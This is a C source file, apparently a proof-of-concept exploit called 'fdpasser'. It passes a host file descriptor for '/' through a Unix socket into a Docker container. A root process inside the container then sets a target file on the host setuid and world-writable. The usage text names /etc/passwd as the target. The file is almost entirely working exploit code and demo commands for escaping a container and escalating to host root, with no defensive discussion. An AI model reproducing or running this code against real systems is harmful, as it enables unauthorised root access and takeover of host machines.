#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/un.h>
#include <unistd.h>
#include <signal.h>

/*
* Demo *
 sudo docker run -it -v $(pwd):/fd ubuntu
./fdpasser recv moo /root
./fdpasser send /proc/$(pidof sleep)/root/moo
*/

/*
 * recv_fd
 * Creates socket at path and waits for message with
 * file descriptor. Writes file descriptor into fd argument.
 * returns 0 on success
 */
int recv_fd(const char* path, int* fd) {
	int sockfd = socket(PF_UNIX, SOCK_DGRAM, 0);
	struct sockaddr_un addr;
    addr.sun_family = AF_LOCAL;
    strncpy(addr.sun_path, path, sizeof(addr.sun_path));
    
    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
      perror("bind");
      return -1;
	}
	
	// Give everybody access to our socket
	if (-1 == chmod(path,S_IRUSR|S_IWUSR|S_IXUSR|S_IRGRP|S_IWGRP|S_IXGRP|S_IROTH|S_IWOTH|S_IXOTH)) {
		perror("(ignored error, chmod)");
	}
	
	struct msghdr msg = {0};
	char buf[CMSG_SPACE(sizeof(int))];
	msg.msg_control = buf;
	msg.msg_controllen = sizeof(buf);
	
	if (-1 == recvmsg(sockfd, &msg,0)) {
		perror("recvmsg");
		return -2;
	}
	
	close(sockfd);
	struct cmsghdr *header = CMSG_FIRSTHDR(&msg);
	*fd = *(int *)CMSG_DATA(header);
	return 0;
}

/*
 * send_fd
 * Connects to socket at path and writes file descriptor in fd argument 
 * to the socket.
 * Returns 0 on success.
 */
int send_fd(const char* path, int fd) {
	int sockfd = socket(PF_UNIX, SOCK_DGRAM, 0);
	struct sockaddr_un addr;
    addr.sun_family = AF_LOCAL;
    strncpy(addr.sun_path, path, sizeof(addr.sun_path));
    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
      perror("connect");
      return -1;
	}

	struct msghdr msg = {0};
	char buf[CMSG_SPACE(sizeof(int))];
	msg.msg_control = buf;
	msg.msg_controllen = sizeof(buf);
	struct cmsghdr *header = CMSG_FIRSTHDR(&msg);
	header->cmsg_level = SOL_SOCKET;
	header->cmsg_type = SCM_RIGHTS;
	header->cmsg_len = CMSG_LEN(sizeof(int));
	*(int *)CMSG_DATA(header) = fd;
	int ret =  sendmsg(sockfd, &msg, 0);
	close(sockfd);
	return ret;
}

int main(int argc, const char*argv[]) {
	int fd;
	if (argc ==4 && strcmp(argv[1], "recv") == 0) {
		int pid = fork();
		if (pid == 0) {
			if (-1 == setresgid(1000,1000,1000)) {
				perror("setresgid");
			}
			if (-1 == setresuid(1000,1000,1000)) {
				perror("setresuid");
			}
			execl("/bin/sleep","sleep","1337",NULL);
			return 0;
		}
		if (recv_fd(argv[2], &fd) == -1) {
			perror("recv_fd:");
			return -1;
		}
		const char *path = argv[3];
		if (path[0] == '/') {
			path++;
			printf("Dropping intial / from %s\n", argv[3]);
		}
		if (-1 == fchmodat(fd, path, S_ISUID|S_ISGID|S_IRUSR|S_IWUSR|S_IXUSR|S_IRGRP|S_IWGRP|S_IXGRP|S_IROTH|S_IWOTH|S_IXOTH, 0)) {
			perror("fchmodat");
			return -3;
		}
		kill(pid,SIGKILL);
		unlink(argv[2]);
		return 0;
	} else if (argc == 3 && strcmp(argv[1], "send") == 0) {
		fd = open("/", __O_PATH|O_RDWR);
		if (fd == -1) {
			perror("Open error: ");
			return -1;
		}
		if (send_fd(argv[2], fd) == -1) {
			perror("send_fd");
			return -2;
		}
		return 0;
	} else {
		printf("Usage: %s [send socket_filename|recv socket_filename target_file]\n", argv[0]);
		printf("Run recv as privileged user\n");
		printf("Example: ./fdpasser recv /moo /etc/passwd\n");
		printf("Run send from unprivileged user\n");
		printf("Example: ./fdpasser send /proc/$(pgrep -f 'sleep 1337')/root/moo\n");
		return 1;
	}
	
	return 0;
}
